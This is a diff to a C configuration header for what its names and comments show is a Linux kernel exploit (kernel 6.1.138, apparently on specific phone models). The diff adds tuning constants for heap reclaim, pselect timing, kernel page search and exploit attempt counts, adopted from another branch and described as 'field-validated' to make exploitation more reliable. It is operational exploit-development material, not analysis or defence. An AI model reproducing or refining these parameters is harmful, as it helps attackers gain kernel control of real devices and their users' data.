@@ -24,6 +24,20 @@
 #define SLIDE_LOCK_OWNER_VALUE 1ULL
 #define SLIDE_USE_FAKE_TASK 1
 #define COMPACT_RT_MUTEX_WAITER 1
+/* fixwave PR #303 tuning adoption (UEDZE4 device-validated; identical set
+ * already field-validated on our e1s targets) — semantics device-independent
+ * reclaim/trigger mechanics only; derived offsets and route geometry stay
+ * CZDE-local (kernel 6.1.138). NOTE: the pselect sync/guard complex
+ * (SLIDE_SYNC_PSELECT_SYSCALL + guard + trigger-age checks) is functionally
+ * bound to APP_REQUIRE_FRESH_P0_SESSION in our slide_app.c wiring — adopt
+ * that pair together in a later wave, not here. */
+#define APP_SLIDE_RECLAIM_SENDS 192
+#define APP_SLIDE_RECLAIM_SNDBUF 16777216
+#define APP_MM_LATE_DRAIN_TRIGGERS 2
+#define APP_DEFER_FINAL_DRAIN_REAP 1
+#define APP_DEFER_ALL_DRAIN_REAPS 1
+#define APP_QUIET_RECLAIM_WINDOW 1
+#define APP_FOPS_PSELECT_DELAY_USEC 50000
 #define SLIDE_TRACEFS_EVENT_ID 106
 #define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000db0c4ULL
 #define SLIDE_PSELECT_WORD_SHIFT 5
@@ -41,7 +55,19 @@
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #define ROUTE_WAIT_SECONDS 8
 #define PSELECT_ENTER_DELAY_USEC 50000
-#define SLIDE_PSELECT_TIMEOUT_NSEC 100000000L
+/* PR #303 / e1s production pselect patience (ours was 100ms local choice) */
+#define SLIDE_PSELECT_TIMEOUT_NSEC 500000000L
+#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 8
+#define APP_SLIDE_FRESH_PAGE_ATTEMPTS 8
+#define APP_SLIDE_KERNEL_PAGE_SEARCH_BATCHES 16
+#define APP_FOPS_FRESH_PAGE_ATTEMPTS 8
+#define APP_FOPS_KERNEL_PAGE_SEARCH_BATCHES 16
+#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 8
+/* one long-lived attempt instead of many short ones: every attempt exit is
+ * a teardown/reset exposure moment (field evidence 3x download mode) */
+#define DEFAULT_EXPLOIT_ATTEMPTS 1
+#define DEFAULT_ATTEMPT_TIMEOUT_SEC 2200
+#define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 1200
 #define APP_ACCEPT_SCHED_TRIGGER 1
 #define SLIDE_KSNITCH_APPENDED_FUTEXES 4096
 #define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
